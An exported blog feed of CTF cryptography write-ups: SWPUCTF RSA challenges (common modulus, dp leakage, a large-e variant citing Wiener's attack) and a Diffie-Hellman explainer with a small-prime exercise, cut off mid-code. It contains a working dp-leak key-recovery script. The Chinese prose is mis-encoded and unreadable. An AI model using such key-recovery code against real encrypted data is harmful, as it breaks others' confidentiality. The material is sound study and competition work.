<h2 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-Phishingã€æ²¡åšå‡ºæ¥-åé¢åœ¨ç ”ç©¶ä¸‹ã€‘"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-Phishingã€æ²¡åšå‡ºæ¥-åé¢åœ¨ç ”ç©¶ä¸‹ã€‘" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]Phishingã€æ²¡åšå‡ºæ¥ åé¢åœ¨ç ”ç©¶ä¸‹ã€‘"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]Phishingã€æ²¡åšå‡ºæ¥ åé¢åœ¨ç ”ç©¶ä¸‹ã€‘</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">eAlice = <span class="number">0x10001</span></span><br><span class="line">eBob = <span class="number">0x10003</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chatEncrypt</span>(<span class="params">pepole, message</span>):</span><br><span class="line">    <span class="keyword">if</span> pepole == <span class="string">&#x27;Alice&#x27;</span>:</span><br><span class="line">        sender = hashlib.sha256(<span class="built_in">str</span>(pepole).encode()).hexdigest()</span><br><span class="line">        sign = hashlib.sha256(<span class="built_in">str</span>(message).encode()).hexdigest()</span><br><span class="line">        encryptMessage = <span class="built_in">hex</span>(<span class="built_in">pow</span>(bytes_to_long(message), eAlice, n))</span><br><span class="line">        <span class="keyword">return</span> sender, encryptMessage, sign</span><br><span class="line">    <span class="keyword">elif</span> pepole == <span class="string">&#x27;Bob&#x27;</span>:</span><br><span class="line">        sender = hashlib.sha256(<span class="built_in">str</span>(pepole).encode()).hexdigest()</span><br><span class="line">        sign = hashlib.sha256(<span class="built_in">str</span>(message).encode()).hexdigest()</span><br><span class="line">        encryptMessage = <span class="built_in">hex</span>(<span class="built_in">pow</span>(bytes_to_long(message), eBob, n))</span><br><span class="line">        <span class="keyword">return</span> sender, encryptMessage, sign</span><br><span class="line"></span><br><span class="line">chatLog = <span class="built_in">open</span>(<span class="string">&quot;Chatting.log&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">encryptedChatLog = <span class="built_in">open</span>(<span class="string">&quot;ChatEncrypted.log&quot;</span>, <span class="string">&quot;w+&quot;</span>)</span><br><span class="line">log = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> chatLog:</span><br><span class="line">    log.append(line)</span><br><span class="line">chatLog.close()</span><br><span class="line"></span><br><span class="line">encryptedChatLog.write(<span class="built_in">hex</span>(n)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(log)/<span class="number">2</span>)):</span><br><span class="line">    <span class="keyword">if</span> log[i*<span class="number">2</span>] == <span class="string">b&#x27;Alice\r\n&#x27;</span>:</span><br><span class="line">        encryptedChatLog.write(<span class="built_in">str</span>(chatEncrypt(<span class="string">&#x27;Alice&#x27;</span>, log[i*<span class="number">2</span>+<span class="number">1</span>]))+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(chatEncrypt(<span class="string">&#x27;Alice&#x27;</span>, log[i*<span class="number">2</span>+<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">elif</span> log[i*<span class="number">2</span>] == <span class="string">b&#x27;Bob\r\n&#x27;</span>:</span><br><span class="line">        encryptedChatLog.write(<span class="built_in">str</span>(chatEncrypt(<span class="string">&#x27;Bob&#x27;</span>, log[i*<span class="number">2</span>+<span class="number">1</span>]))+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(chatEncrypt(<span class="string">&#x27;Bob&#x27;</span>, log[i*<span class="number">2</span>+<span class="number">1</span>]))</span><br><span class="line">encryptedChatLog.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>å·²çŸ¥ eAlice = 0x10001ã€eBob = 0x10003</p>
<p>c = pow(m,e,n)</p>
<p>è¾“å‡ºæ–‡ä»¶ä¸­åŒ…å« hex(n) åŠ åå…­ç»„ str(chatEncrypt(â€˜Aliceâ€™, log[i*2+1])) ï¼Œå…¶ä¸­senderå’Œsign sha256åŠ å¯† å¯†æ–‡æœªåŠ å¯†</p>
<p>æ‰€ä»¥å·²çŸ¥å†…å®¹ä¸º n å’Œ16ç»„c</p>
<p>ä½¿ç”¨åŒä¸€ä¸ªæ¨¡æ•°nè¿›è¡ŒåŠ å¯† ä¼˜å…ˆè€ƒè™‘å…±æ¨¡æ”»å‡»</p>
<p>n = 0x63651c7146a0e7b724297d4212b5128ede8631b886179f7c7770877317d0d7d91d74aa9a8763ef0b8640f0d3ec80ae2581af3bec1928a308d6e220e2b7bc7dbee675445c7503b8469ccb3b6d36b69a19e67aad605e83886f274308904e5cd660fb627899075dca6ba585001d4e0c4b496c79ea1952d961421eeda77b80ed3716d6eaba40de17848499adbf098b85e6807ee4fdea7059d5faf3b2b58d1e17322ce6f3747f1cd138db0593d630e97573bd42c8b02bac2d780b8b0b6ac915cb18f082af21c3c5a4849b6e8e19862b1160888bb069adb8bcbcf93693ea8993bc26c1321d36b137a215bf56dfe9af8ba511f5d89b016a68ca03d9bd14091c04027b01</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x44e199407b72439f4fad42a3a13ff31fe22daacd0b1ec17f34f260ffa8a7be74b75ac624ab147b8342b0cd97024b1d7d40d5071bc65d62377b3eb2b718e086096084219360d7bf967ba961afa05054d968d8b3493870831e92622ead173ba41e3d345e068cc7640bb43f3ff9654ab48183f6dbe752ee26b9c908d4b31fcb8e445963ef261e99bc238441a2c0e82fdf07359702d0ab664ab216995c7e27d91e885a5ee37ae1f6895a7d38155edcd8990c36fa2ac6d7e14abec471cc96a8ba34497f3073e0906f683145e03fc38c8fa40ba4250d2d907f3071c3db30d941b321c349d9d800bed6be61b00a3797aef85f7fb2cc36413556f6438fae3b9476adab6e</span><br><span class="line">0x10cde6bdf0ac17952be139709d97fa574bfbeffd22e9a0c0fde85811797decfd4b8c669df862a476c66ae47e2831d23f1dde85290a58489a8cabf9f8bf4e94c80009634ee2deb13391c1ede5005a4fd3a58b08b185eb4d10081f34676c3bf546ae641141e63bab05ca9e40bdd5c9422857f5da5a3f3f14f87a2235196dad758065d0108b8a450939fe5084cea40d8ab8e1f5b87df21def507285464cb26e2cc5ad3ade03d83ac74557ec51c4eb2422dc45b7022cca62a4d1896bf13fef9bb38f5dc44d2ce6ab28222655ed27104b1e18f2baaa9bbc4200e8cf531cda25c9ae4f07e79885efc7b7fb3dcad0f07de66a1a1708f6bc96906a184caea4d23d1af4cf</span><br><span class="line">0x31d25cdd014ad6ccef4e417ee1a1a59ebff514979887b9e05bda8a577dd8f3b62fa4ef09780b96d5878957a2ab11116b3a1d77e26cc4a0510f83fb86247170798aa0470215ea0cf1646291ee111e70fb83094a73d6f4540957ac428094c806ed2a6fb68db8c47170ae747375277deda72aaf887c09c06e372c62af6ee559f96e13b9f2d4f7a72df4b4d9bfb8975510ae165da5d0ed9727c9168669d2bc762cd49bcf316d3bc4d29e9429016f4ba5f1b12390c433248cb443c97df5fe6992016543054150af623edaf29ef81b231491bafbbbe0f607dd754f5d6d702a44a9b99533174a6c4bb6e727683c05a908bffdfdb629972f51f4ef698bbffebed566a0c5</span><br><span class="line">0x7b1ef6b4cb43ca5747d17ebf5a42d49b0f24b65a13101dfeb995a9cf753f45afd65c93d908629c008ea8d6577cb6c32960486b838d335974ab15a58d38a39a8d8f6b16a0369da059d2a5298bc4efb6491ef4537e958e693c17acdded7fd527548a0800f6f1a79ba484f2c4b15662b2bee4e5286b1972b3fd78b2d9ba5b5b1c58cb6e226fb55f4e6c266ef69aff05971a9594fc9f96ffbb98022fb744c3e081e59afccaf9258f6f5921765c5324b2ff3dc3d64c6164d2f26cbaadec66669e8e77b9f9196cfa46e68cb3f5f53435e016297f9d0ce9131d9dbaee616b34eb5ebd871d50226dae36e648a3e351cb9e46969ad7d578d367ca546d062f3ab0313eb9b</span><br><span class="line">0x401156c77529718d7a5fff5889703d9d000f1e8324d76eb05728fe83b3a9f9a689abd4b01af9c036c35025c21603d4256b5edd12803192030ca198be70ead4f6113b147e8e3f0d3743cf3e7aebf22151b468ccacd681989158afdfc61dbd46d8d67e85d09491217a065ec04d4b12f2e31098802e1094f06aaa8a8c43785496243e881f81fb90254dd3342699e6c433f8f603c00605d6b34c6ec3117cf78fcb1a72a9bab83e05d1b489148a90f7816fa5f84fde195ba1bcddb26df6b78ceb09d919807b7bb7b7cce257b23fb34508d1ffaaec17cf5e1f66ea31e692d077859ca16ee24cd2d6923744c98cafbf39c41c0bbf68a6c086b62614792e23038643c955</span><br><span class="line">0x469ff6f3649b902be1e3b59aa68eee1b10a1056e109872b42c00a3d574ab13337e4b09d094e1a43b16d4c5ebd266266e2564cf3b630a3d3207b5aacfa7f50ab621034a7dfcd231ed3247e74093c4836bfefc6af53857ee09d242bcd346bcb9e6e1cfae3c38fcee9f3cc22fe51d7a9ac96f914a0f0985639c8aeafd254f0c6304398138c256c1c80e4969d7d3d4ce2e8885608bc2d8d83bf7a218aaae015341bbf7d873d54a4ec0afce0b6a7898df840b4b682276c394ca3a38e688b8aeea675ede5d28908a89d59c98321b3c14900d4a89249784a12066d385312ae307a8438c8e49b42b1d234546e46c1536ae0b5178abc609d9061b5a8711ae6c2a7140a23e</span><br><span class="line">0x1c39de925a76c7207714684fc339567cd439a106ee1b2c09232652f899f798c459629de9d4ba464666d1a050642964d446762b9be80bb417aa411ae81d30751acdda9d914581fb8715853aaa8869bcf6050c0a9f6a0060a888f3353298e5617f0c1807a711418ef91d7662864187c360c48a6988a7004e6a786a3071bebfb1198456f7fa5a2a651fa31cd8b0c1e9fbb515a37977dccfce79784617e83c760d6bba6e65cc566e96a01143c9ee7dfca95bae3a4af0f30eb579a0ad8a8be453bbcf147dc9c2a048d877621e507d208e6105929d5beb28bc86e58570b8e2d32927d7d7f65dc4ee929abb85a7cc73194ebb4f4ff84213f28dabfd81eaac5c8ad9ab5</span><br><span class="line">0x256996daa2c9dae14a986ff70f0f453b1b12bcbbce4232380e4145e141684fbbe91ab67c524159487ca26726690f8da588cc7af61801ab3065290bfa4d440b85803fc3b9d010d346c7b4f7f2b8f0b3253102f10e6812592bac933712b71baf0cf470d0b782894693dd256c2ead766c3c271fb45d65008316511710d22ea318cef51731c598314101846a7f9674fba6adbddffa16bb15ea03021c54038e46c7a4846f45211ba17e733577153a78a7ec1d463d07e7e7c1ac8cfe06625ff3aac27d2f651ef04618ec6107652b0627528748640b0c9e7a446e5cdece79080b0009eab5ba41e0db367049ce69687ba2cae8481761b87fd0e6a7ba5e84ac55a5231d0f</span><br><span class="line"></span><br><span class="line">0x5a045180ce4cbcdb8d4f48ae4fafb4dab8b3a1a829afd15f3aa5afa90c03aca9eb6b1dec208594580fba45b8af15cf7ac60031cb9c28e402a0a563fcf9feeed7c05de10104560fb1e66463be3573fc98d7b4178fb1d9c99af7cbc4da65fbb40b5fe26bd78bb83e94236136e0ab86f9228963b90d926abb8002f9e6a8ad695a826c12454e6bf6d44624188d8454e4afa133ed9cffcf504239bc2df4eddb0910f47047858da710dd1ef7b96b2430b69fc78b3a8e4d19657b4fb2fbcbac656e851d86fee14f487a4e4fcca93fef24eb9e3f72ee3aebe0aa27e14a2889c13410a22a4ff99802729a1e802b1e343abe51f99f9b131e6e932ef6336cb2539befc7ad2b</span><br><span class="line">0x2ca6110b03ecad45d9f8969c6a47e4e434708288bb35738f4e1974647ae4ac5782377117bf96a25936c5f049ce5fb89aeb9022c99f1eb2085f0a2e9e06f5bdd7c512dea7fa839ae55eb78d95f8ed9a34e35fe901cd499efe116142976e6170c85987cb1355ddf1d7cf6e66120a355ae02cce4ccef86ae27860f55c61249cf5b6daf728c570bfeb8f03f6dfab1cf168ab16e7e1efe1582f9717d449984184c604ec5af6070837b1350dfaf188b6bb76ad81f5c70804fa7a79d2c1c5f8de9b5cb9ed859bf75f912c445fed04252edfa590e2354b72d08331ab631b9d59835435e6c0e80e418ba6c2e1655ca7ef19555b792f768c2d07bc7deabfc8c06a9061d987</span><br><span class="line">0x148dce72b5b82bcc8bda6d5d2aa0ef4c665b647edb4e588058519c9b4fd3c25fc24f73569bdf14491d5a6ecc01aa6ee797711e612b7e271f2f551407b7f73c2b5fe9bba6168777bd82a4ef3c5ac46bdb339a43ccdea2ca913141eb909ae7e03cba79331556f3111679878748819175f921a114c57c001d22fe4ef26bed7c56725fd982d4fa356b2e25e962a88471feef63e82c9640b0293b98e1971ab78111e76fd485dc6c53ec656266759c2c9b4a2465ad1618fa7d89454161b1d799c90af1d055d9749a49c8aa9a1d956683841c234641e0ca30d97865355da3c5879db378ef9c44e78320c4f97ae50c385cb1e4877c2ec2c1fa64915625654ba0c8c01efa</span><br><span class="line">0x4449cb7346cd8bc4c4fc0e0c492cc40a1b4f1a3f93815eb19353fb82a3c34cfdfe91bc01a80f779998185a6a36cf68094641367fd912f146d9ec793bf88d2fea7f793375ea4d79e95c8c18e8dc83e0d7590fe007862024e82786e11754ecb4b93c19c01550631196fcaa34b73646125b1baa8fd8726d99f9752abad9a5e2136e0a909700a0423fbd97865b87790c6e16b85a51aa7dd987e84cc7a8f4617a0de31f4d1c538587a8fd8b91b50f8551c306c3240339c8d89f9a6842f65f59db0ac935640f998e705ec6dad8b5403e786bcbc901b9cdaa671fe5d05707d637772199779bce17e7942eb185aa86ce668863261f85539696b5a5835826f67cd25acd49</span><br><span class="line">0x2197e3bc7c4bc600dac76f2b4dce190bba84f5a2df71e086efa5d9e1891d93ef7a722a8912c65c71a39fd495da83078ba4ecfae537e7cce6ca4cc2621e6f019fc10a322fffc66d4a2f9d0674c300df5c5cb290d8ad0228b5a22d86a4e99c171ce2d29f0ad52fa07b17fb6accfba6e78af4c3c1f5f578c7b496df797cc38b9c8a61b6b1fdc5648291753283d6dc3dc11e10ad5513bbb4b579a0b1c07c92fdb59df8a4f036e050e4d4668586f16685810f2e8cf62763d1d17fc493ad04ded7fd64e09b8299eeb5aa51b2e4287bec9b042285e49e04adfee80235eea001b3443976e460dd87710343c503129924e8cbb5b71849f3cb07fe9d7956c688e7521cbbae</span><br><span class="line">0x224fda6f7940f6a120d586691428da3a93baec1d4be63ddad058b00a78d311a111aaf3174d6ab8bffb5403c8b721cd64d5440da5607d7d8729ee732fd86e2407c2fdc8ad3bba763e856c2a517cafeae8465952ff0854d712fdbb410f924e5bac561411beaaddf5c02536f273704a14b5de13c51cba3dc029bd2c7250f972b1679e1f21acdc27cda6c33b72a4258f68d00395e82c2f0d92c153ad5240b26ef581e0b5ba78c0c9409a5fb02f4d49707e9b941e0ad37e22ef9c42a568a10b000e91059650b620fd69552c4d267ed1b479378e60870cfd2026d248d32b9600f3b8ba2c7d05c6872847e43760d51d3b69e85449d21a3eb5eeef82d450a803b4500b79</span><br><span class="line">0x32b9ecdea94109ebb2fac3a1bbc8605a2e7f3622a2559e1e0811921881b736de43771ba97d0c071ea05caa613c84f4f3b8f553f2ca2eccc1c3c8708ded528a7fc34881530a95d95dae4bdd27967f0b8b706530725d62447d732615825aadd901fa86675431e245aa1c3937d5f4d76f06a52caa8ca2100a9568c1817f14c6e6bb01f7d4543bd0d985ad2e1ee4310db1eafa37ae90b38582ef6212552e8bf6c6cbd483ae580a65b4171dd6bb767b3ae50d6a0f8bc9d45ca7d2ec12bea582b7aa39c3df3e20c2de9851456f111719b4ea6fe2d9c3ada0787ec83e4a7e5a2348b58526d4d267db693e508599f9cd31729a36d510aec40c756974a6f1e825fbcfc1d1</span><br><span class="line">0x1ceec14e3fea63e688f500df76526d391cb411aba993a7407671e234698441e4c3c80efdf0092f0f7af0e14cedde5efe144ee8db2b5a0e7f8f300ca49f81dd189a83527f0c846ac1cbed4ba909f8df04efdeacaa616c005a609f43cdafac49ce49b482a5e244e1cd96fb4643066887d8d858314e816dd08df711b46fded216c4b8bee5a24379522e73a84e53ae0d778e47e7c5e96869a1666d90abea5638719932baf857745e50d3f32933d62d9bbffdc8d6b1ca6232e2bca8533afdd5b4175ed61db1e604d9645594b3dcf89e0550175bbb6d3de99598c665911c26e824f36b277681cfa802989c8b010d2143fe94ebef8dee4da4e5a4f097fb3a22b1242c52</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="SWPUCTF-2023-ç§‹å­£æ–°ç”Ÿèµ›-dpdp-ã€dpæ³„éœ²ã€‘"><a href="#SWPUCTF-2023-ç§‹å­£æ–°ç”Ÿèµ›-dpdp-ã€dpæ³„éœ²ã€‘" class="headerlink" title="[SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]dpdp ã€dpæ³„éœ²ã€‘"></a>[SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]dpdp ã€dpæ³„éœ²ã€‘</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span> + <span class="string">b&#x27;1010101010101010101010101010101010101010100010101010101010101010101101&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">dp = d % (p-<span class="number">1</span>)</span><br><span class="line">m = s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;dp = <span class="subst">&#123;dp&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">62950660589752377241535942010457460675378335694404721223426371627802159493655570041534480026979837056215567303530448462076388942749116962945931432723672826148999814815864738069663127706046027850586024555861960247057288826014343547293035737544457656904257388300461848219257240252715837662741274235378360898441</span></span><br><span class="line">c = <span class="number">26392919777656338278184497106215581599692023606797351841011065350738534402079717897589592521000832026751736045905247050532819571969784687491977953157313304550096179520376626220816081159472339787295872214912587497324709488986746768994907107727184468228540635002062232484115731701648311946527233449512543132274</span></span><br><span class="line">dp = <span class="number">7088497034630351463006975624795947102639056977565074157092915907376477955247769847204254053775159112398217033648894620506901638351932922911273150932128973</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>dpæ³„éœ² å¯ç”¨ä¸‹é¢è¿™ä¸ªæ¿å­</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">62950660589752377241535942010457460675378335694404721223426371627802159493655570041534480026979837056215567303530448462076388942749116962945931432723672826148999814815864738069663127706046027850586024555861960247057288826014343547293035737544457656904257388300461848219257240252715837662741274235378360898441</span></span><br><span class="line">c = <span class="number">26392919777656338278184497106215581599692023606797351841011065350738534402079717897589592521000832026751736045905247050532819571969784687491977953157313304550096179520376626220816081159472339787295872214912587497324709488986746768994907107727184468228540635002062232484115731701648311946527233449512543132274</span></span><br><span class="line">dp = <span class="number">7088497034630351463006975624795947102639056977565074157092915907376477955247769847204254053775159112398217033648894620506901638351932922911273150932128973</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):  <span class="comment"># åœ¨èŒƒå›´(1,e)ä¹‹é—´è¿›è¡Œéå†</span></span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:  <span class="comment"># å­˜åœ¨pï¼Œä½¿å¾—nèƒ½è¢«pæ•´é™¤</span></span><br><span class="line">            p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">            phi = (q - <span class="number">1</span>) * (p - <span class="number">1</span>)  <span class="comment"># æ¬§æ‹‰å®šç†</span></span><br><span class="line">            d = gmpy2.invert(e, phi)  <span class="comment"># æ±‚æ¨¡é€†</span></span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># å¿«é€Ÿæ±‚å¹‚å–æ¨¡è¿ç®—</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;CTFCTFNSSNSS&#125;1010101010101010101010101010101010101010100010101010101010101010101101&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2023-ç§‹å­£æ–°ç”Ÿèµ›-dpdpdpdp-è¿˜æ²¡åš"><a href="#SWPUCTF-2023-ç§‹å­£æ–°ç”Ÿèµ›-dpdpdpdp-è¿˜æ²¡åš" class="headerlink" title="[SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]dpdpdpdp [è¿˜æ²¡åš]"></a>[SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]dpdpdpdp [è¿˜æ²¡åš]</h2><p>å’Œä¸Šé¢é¢˜ç›¸æ¯” eå˜å¾—å¾ˆå¤§ æ‰€ä»¥æ— æ³•ç”¨ä¹‹å‰éå†çš„æ–¹å¼</p>
<p>å¯ä»¥ä½¿ç”¨ç»´çº³æ”»å‡»</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = getPrime(<span class="number">128</span>)</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">dp = d % (p-<span class="number">1</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;dp = <span class="subst">&#123;dp&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">92288362151232755164303382554034496430634785857894506752180261103500715219090974532177552845107426542175470207920267802066773828210866572070045093611090322738109527534622730588618668861998969946471756352024368486322527057077613762697792913167023012077178671066981439295386486943067698150993422039585259179729</span></span><br><span class="line">e = <span class="number">229991316986730339421575788374847647237</span></span><br><span class="line">c = <span class="number">66178170892880340054212366602556925884485962775832591797127163461420023986798822926684824340567060840259672460835004142425374706821346941926520921852009455818529825976414766339170445233789109526300838535719649346266975388774091834431039678689254534566870194580604694419819400454951059125553501095973278807456</span></span><br><span class="line">dp = <span class="number">8987556601717285362487353965045062789633142861774364363374961991445049127918653163458814169532860957264061203394944931114888144611267605606197232438332289</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Diffie-Hellmanç®—æ³•</title>
    <url>/posts/b9d99e81/</url>
    <content><![CDATA[<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="https://fishni.github.io/2021/03/16/Crypto-02-Diffie-Hellman%EF%BC%88DH%EF%BC%89%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2/">https://fishni.github.io/2021/03/16/Crypto-02-Diffie-Hellman%EF%BC%88DH%EF%BC%89%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2/</a></p>
<h3 id="Diffie-Hellmanç®—æ³•"><a href="#Diffie-Hellmanç®—æ³•" class="headerlink" title="Diffie-Hellmanç®—æ³•"></a>Diffie-Hellmanç®—æ³•</h3><p>ç§˜é’¥äº¤æ¢ç®—æ³• æ˜¯ä¸€ç§å»ºç«‹ç§˜é’¥çš„æ–¹æ³•ï¼Œè€Œä¸æ˜¯åŠ å¯†æ–¹æ³•ï¼Œæ‰€ä»¥ä¸€èˆ¬éœ€è¦ç»“åˆå…¶ä»–ä¸€ç§åŠ å¯†ç®—æ³•ä½¿ç”¨</p>
<p>å¹‚æ¨¡è¿ç®—</p>
<p>æ•´æ•°b(åº•æ•°)çš„eæ¬¡æ–¹(æŒ‡æ•°) é™¤ä»¥æ­£æ•´æ•°m(æ¨¡) æ‰€å¾—çš„ä½™æ•°c ç§°ä¸ºå¹‚æ¨¡</p>
<p><img src="/posts/b9d99e81/1.png"></p>
<h4 id="DHKEåè®®çš„è¿‡ç¨‹"><a href="#DHKEåè®®çš„è¿‡ç¨‹" class="headerlink" title="DHKEåè®®çš„è¿‡ç¨‹"></a>DHKEåè®®çš„è¿‡ç¨‹</h4><p>ä¸‹é¢ä¸¤ä¸ªå›¾ç›¸å¯¹å¾ˆå¥½ç†è§£</p>
<p><img src="/posts/b9d99e81/2.png"></p>
<p><img src="/posts/b9d99e81/3.png"></p>
<p>åŸæ ¹ï¼š <a href="https://blog.csdn.net/dreamzuora/article/details/52744471">https://blog.csdn.net/dreamzuora/article/details/52744471</a></p>
<blockquote>
<p>å‡è®¾ä¸€ä¸ªæ•° g æ˜¯Pçš„åŸæ ¹ï¼Œé‚£ä¹ˆ g^i mod P çš„ç»“æœä¸¤ä¸ªä¸åŒï¼Œä¸”æœ‰ gâˆˆ(1,P) iâˆˆ(1,P) é‚£ä¹ˆgå¯ä»¥ç§°ä¸ºPçš„ä¸€ä¸ªåŸæ ¹</p>
<p>å³ g^i mod p â‰  g^j mod p (pä¸ºç´ æ•°) ä¸” iâ‰ j i,jâˆˆ(1,p-1) åˆ™gä¸ºpçš„åŸæ ¹</p>
</blockquote>
<p>å…‰æ»‘æ•°ï¼šå¯çº¦æ•°åˆ†è§£ä¸ºå°ç´ æ•°ä¹˜ç§¯çš„æ­£æ•´æ•°</p>
<p>ä¸€èˆ¬æ¥è¯´ ç´ æ•°600ä½ä»¥ä¸Šæ—¶ï¼Œå¾ˆéš¾è¢«ç ´è§£ã€‚å½“ç´ æ•°è¾ƒå°æ—¶ï¼Œå­˜åœ¨æš´åŠ›ç ´è§£çš„é£é™©</p>
<h4 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h4><p>My buddies Whitfield and Martin were trying to share a secret key between  themselves, and I was able to eavesdrop on their conversation. I bet I  could probably figure out their shared secret with a little mathâ€¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 69691</span><br><span class="line">g = 1001</span><br><span class="line">A = 17016</span><br><span class="line">B = 47643</span><br></pre></td></tr></table></figure>

<p>Note: submit either the shared secret or the shared secret wrapped in utflag{}</p>
<p>g^i mod p = A -&gt; i (b)</p>
<p>g^i mod p = B -&gt; i ï¼ˆa)</p>
<p>åˆ†åˆ«ç®—å‡º A Bçš„ç§é’¥i iå–å€¼åœ¨ 1~p</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">K = B^a mod p = A ^ b mod p</span><br><span class="line"> </span><br><span class="line"><span class="built_in">pow</span>(B,a,p) <span class="built_in">pow</span>(A,b,p)</span><br><span class="line"> </span><br><span class="line">p=<span class="number">69691</span></span><br><span class="line">g=<span class="number">1001</span></span><br><span class="line">A=<span class="number">17016</span></span><br><span class="line">B=<span class="number">47643</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># g^i mod p  = A   -&gt; i</span></span><br><span class="line"><span class="comment"># g^i mod p = B   -&gt; i</span></span><br><span class="line"><span class="comment"># åˆ†åˆ«ç®—å‡º A Bçš„ç§é’¥i    iå–å€¼åœ¨ 1~p</span></span><br><span class="line"><span class="comment"># K = B^a mod p = A ^ b mod p</span></span><br><span class="line"><span class="comment"># K = pow(B,a,p)    K = 